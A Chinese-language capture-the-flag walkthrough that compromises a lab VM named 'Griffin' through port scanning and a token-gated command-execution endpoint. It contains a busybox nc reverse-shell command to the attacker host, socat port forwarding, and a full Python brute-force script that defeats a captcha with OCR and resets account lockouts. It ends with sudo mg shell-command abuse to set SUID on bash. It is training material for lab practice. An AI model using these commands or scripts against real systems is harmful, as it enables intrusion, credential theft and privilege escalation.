# **一、信息收集**

首先，使用`arp-scan`工具对本地网络进行扫描，以发现目标主机的IP地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.132 08:00:27:9e:89:aa       PCS Systemtechnik GmbH
...
```

确定目标IP地址为 `192.168.205.132`。

接下来，使用`nmap`对目标主机进行全端口扫描，以识别开放的端口和服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.132
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 09:24 EDT
Nmap scan report for novice.com (192.168.205.132)
Host is up (0.00038s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
MAC Address: 08:00:27:9E:89:AA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
```

扫描结果显示目标开放了`22`端口（SSH服务）和`8080`端口（HTTP代理服务）。

# **二、Web渗透与漏洞利用**

## **2.1 Web目录探测**

访问`http://192.168.205.132:8080/`，页面显示欢迎信息。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.132:8080/
Yo, welcome to GriffinCorp, the coolest company in Quahog!
Peter Griffin’s got your back with top-notch service.
Don’t mess this up, or Lois is gonna be pissed!
```

使用`dirsearch`工具进行目录扫描，发现了`/info`和`/debug`两个路径。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -u http://192.168.205.132:8080
...
[09:28:14] 403 -   23B  - /debug
[09:28:18] 200 -   49B  - /info
...
```

## **2.2 远程命令执行（RCE）**

访问`/info`路径，发现它会返回一个诊断令牌。多次访问后发现，该令牌是随机变化的。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.132:8080/info
System Info: Diagnostic token = BetaToken123
...
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.132:8080/info
System Info: Diagnostic token = CyberCorpDebug123
```

访问`/debug`路径提示缺少`token`参数。尝试将从`/info`获取的令牌作为参数提供，页面提示缺少`run`命令。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.132:8080/debug?token=CyberCorpDebug123'
Missing run command
```

这表明该端点可能存在命令执行漏洞。通过`run`参数传递`id`命令进行测试，成功执行并返回了结果。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.132:8080/debug?token=CyberCorpDebug123&run=id'
uid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)
```

**注意**：由于令牌是随机的，需要先访问`/info`获取有效令牌，再立即用于`/debug`端点。

## **2.3 获取反向Shell**

在Kali上设置`netcat`监听8888端口。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
```

利用已发现的RCE漏洞，执行一个反向shell命令。这里使用`busybox nc`来建立连接。

```bash
http://192.168.205.132:8080/debug?token=CyberCorpDebug123&run=busybox%20nc%20192.168.205.128%208888%20-e%20/bin/bash
```

成功接收到反向shell，当前用户为`lois`。

```bash
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.132] 45526
id
uid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)
```

随后，通过一系列命令将简易shell升级为功能完善的交互式TTY。

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 36 columns 178
```

# **三、权限提升**

## **3.1 本地枚举**

获取`user.txt`中的第一个flag。

```bash
lois@Griffin:/home/lois$ cat user.txt
flag{user-f6b63474e7cc20b0893a82beb9e3b3fd}
```

使用`sudo -l`检查`lois`用户的sudo权限。

```bash
lois@Griffin:/home/lois$ sudo -l
...
User lois may run the following commands on Griffin:
    (ALL) NOPASSWD: /usr/bin/cat /root/startup.log
```

`lois`可以免密使用`cat`命令读取`/root/startup.log`。检查网络连接情况，发现除了公网的`8080`和`22`端口外，还在本地`127.0.0.1`上监听了多个端口，包括一个`80`端口。

```bash
lois@Griffin:/opt$ ss -tnlp
State                   Recv-Q                  Send-Q               Local Address:Port
...
LISTEN                  0                       5                          0.0.0.0:8080
LISTEN                  0                       128                        127.0.0.1:80
...
```

## **3.2 端口转发与Web二次渗透**

由于`80`端口只在本地监听，我们无法直接访问。使用`socat`将本地的`80`端口转发到`8000`端口，以便从外部访问。

```bash
lois@Griffin:/opt$ socat TCP-LISTEN:8000,fork TCP4:127.0.0.1:80 &
```

访问转发后的`http://192.168.205.132:8000/`，这是一个关于"Family Guy"的网站。再次使用`dirsearch`进行目录扫描，发现`robots.txt`文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.132:8000/robots.txt
User-agent: *
Disallow: /family

...

rockyou: world's best dictionary, hands down!
```

`robots.txt`禁止访问`/family`路径，并暗示`rockyou`字典可能会派上用场。

## **3.3 登录爆破 (lois -> meg)**

访问`/family`路径是一个登录页面，包含用户名、密码和验证码。页面提示`brian`用户每5次尝试后会被锁定，需要重置。

为此，编写了一个Python脚本，使用`ddddocr`库识别验证码，并结合字典对`brian`用户的密码进行爆破。脚本逻辑包括自动识别验证码、处理账户锁定以及多线程爆破。

```python
import requests
import ddddocr
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
import queue

url = "http://192.168.205.132:8000/family/"
cap_url = "http://192.168.205.132:8000/family/captcha.php"
rst_url = "http://192.168.205.132:8000/family/?reset=1"
user = "brian"
dict_file = "5000q.txt"
max_workers = 2

ocr = ddddocr.DdddOcr()
pw_q = queue.Queue()
found = queue.Queue(maxsize=1)
pr_lock = Lock()
total = 0
MAX_RETRY = 3   # 每个密码最多重试 3 次


def worker():
    global total
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
        "Accept": "text/html,*/*",
        "Accept-Language": "zh-CN,zh;q=0.8,en;q=0.2",
        "Connection": "keep-alive",
        "Referer": url,
        "Upgrade-Insecure-Requests": "1"
    })

    tries = 0
    while True:
        if not found.empty():
            return
        try:
            pw, retry = pw_q.get_nowait()
            tries += 1

            cap_img = s.get(cap_url, timeout=5).content
            cap = ocr.classification(cap_img).strip()

            if len(cap) != 4:
                if retry < MAX_RETRY:
                    pw_q.put((pw, retry + 1))
                continue

            r = s.post(url, data={"username": user, "password": pw, "captcha": cap}, timeout=5)

            with pr_lock:
                total += 1
                n = total

            res = r.text

            # 账号被锁定
            if "ACCOUNT TEMPORARILY LOCKED!" in res:
                with pr_lock:
                    print(f"[{n:4d}] 🚫 {pw:<12} | 🔤 {cap} | 原因: 账号被锁定 → reset")
                try:
                    s.get(rst_url, timeout=5)
                except requests.RequestException:
                    pass
                if retry < MAX_RETRY:
                    pw_q.put((pw, retry + 1))
                continue

            # 破解成功
            if "Invalid security code!" not in res and "Incorrect password!" not in res:
                found.put((user, pw, cap, n))
                with pr_lock:
                    print(f"\n[+] 🎉 破解成功！🎉\n    用户名: {user}\n    密码: {pw}\n    验证码: {cap}\n    尝试: {n}")
                return

            # 失败原因输出
            reason = "未知原因"
            if "Invalid security code!" in res:
                reason = "验证码错误"
            elif "Incorrect password!" in res:
                reason = "密码错误"

            with pr_lock:
                print(f"[{n:4d}] ❌ {pw:<12} | 🔤 {cap} | 原因: {reason}")

        except queue.Empty:
            break
        except requests.RequestException:
            if retry < MAX_RETRY:
                pw_q.put((pw, retry + 1))
        except Exception as e:
            with pr_lock:
                print(f"[!] 线程异常: {e}")


if __name__ == "__main__":
    try:
        with open(dict_file, encoding="utf-8") as f:
            for p in [x.strip() for x in f if x.strip()]:
                pw_q.put((p, 0))   # (密码, 重试次数)
    except:
        print(f"[-] 字典未找到: {dict_file}")
        exit(1)

    print(f"[*] 开始爆破 | 用户: {user} | 字典: {dict_file} | 总数: {pw_q.qsize()} | 线程: {max_workers}\n")

    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        list(ex.map(lambda _: worker(), range(max_workers)))

    if found.empty():
        print(f"\n[-] ❌ 爆破失败")
```

经过爆破，成功获得`brian`用户的密码。

```
[+] 🎉 破解成功！🎉
    用户名: brian
    密码: savannah
    验证码: 8upj
    尝试: 555
```

使用`brian:savannah`登录后，在Cookie中发现一个`auth_token`。经过分析，该token泄露了`meg`用户的凭据。

```
meg:lovelyfamily
```

使用`su`命令和该密码成功切换到`meg`用户。

```bash
lois@Griffin:/opt$ su meg
Password: lovelyfamily
meg@Griffin:~$ id
uid=1001(meg) gid=1001(meg) groups=1001(meg)
```

## **3.4 Sudo提权 (meg -> peter)**

检查`meg`用户的sudo权限。

```bash
meg@Griffin:~$ sudo -l
...
User meg may run the following commands on Griffin:
    (ALL) NOPASSWD: /usr/bin/python3 /root/game.py
```

`meg`可以免密以root权限执行`/root/game.py`脚本。执行该脚本后，它会在`6666`端口上启动一个监听服务。

```bash
meg@Griffin:~$ sudo /usr/bin/python3 /root/game.py
Server listening on port 6666...
```

该服务设计了三个挑战：数学计算、凯撒密码解密和MD5哈希计算（3s时间限制），所以需要编写一个客户端脚本与该服务进行交互。

```python
import socket
import re
import hashlib

s = socket.socket()
s.connect(("192.168.205.132", 6666))

data = s.recv(4096).decode()
print(data)

match = re.search(r"\((\d+) \* (\d+)\) // (\d+)", data)
a, b, c = map(int, match.groups())
ans1 = str((a * b) // c)
s.send((ans1 + "\n").encode())

data = s.recv(4096).decode()
print(data)
s.send(b"flag{fakeflag}\n")

data = s.recv(4096).decode()
print(data)
x = re.search(r"MD5\((\d+) \+ UNIX timestamp: (\d+)\)", data)
param = x.group(1) + x.group(2)
md5_hash = hashlib.md5(param.encode()).hexdigest()
s.send((md5_hash + "\n").encode())

print(s.recv(4096).decode())
s.close()
```

成功通过所有挑战后，服务返回了一个密码。

```
Congratulations! Flag: HMV{Wow!VeryFuuuuuny!}
```

这个密码`Wow!VeryFuuuuuny!`实际上是`peter`用户的SSH密码。使用该密码成功登录`peter`账户。

```bash
┌──(pythonvenv)─(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh peter@192.168.205.132
peter@192.168.205.132's password: Wow!VeryFuuuuuny!
...
peter@Griffin:~$ id
uid=1003(peter) gid=1003(peter) groups=1003(peter)
```

## **3.5 Sudo提权 (peter -> root)**

最后，检查`peter`用户的sudo权限。

```bash
peter@Griffin:~$ sudo -l
...
User peter may run the following commands on Griffin:
    (ALL) NOPASSWD: /usr/bin/mg
```

`peter`可以免密以root权限运行文本编辑器`mg`。`mg`编辑器可以通过执行外部shell命令来进行提权。

1.  创建一个脚本`/tmp/a`，内容为给`/bin/bash`添加SUID权限位，并赋予其执行权限。

    ```bash
    peter@Griffin:~$ echo 'chmod +s /bin/bash' > /tmp/a
    peter@Griffin:~$ chmod +x /tmp/a
    ```

2.  以sudo权限运行`mg`。

    ```bash
    peter@Griffin:~$ sudo /usr/bin/mg
    ```

3.  在`mg`编辑器中，按`Alt-x`，输入`shell-command`并按回车。
4.  在新的提示符下，输入`/tmp/a`并回车，执行我们的脚本。
5.  按`Ctrl-x` `Ctrl-c`退出`mg`编辑器。

此时，`/bin/bash`已被设置了SUID位。使用`-p`参数运行bash以保留有效用户ID（euid）。

```bash
peter@Griffin:~$ bash -p
bash-5.0# id
uid=1003(peter) gid=1003(peter) euid=0(root) egid=0(root) groups=0(root),1003(peter)
```

成功获得root权限。读取最终的flag。

```bash
bash-5.0# cat /root/root.txt /home/lois/user.txt
flag{root-be93b7d7f0a30d5159c0460874e6e015}
flag{user-f6b63474e7cc20b0893a82beb9e3b3fd}
```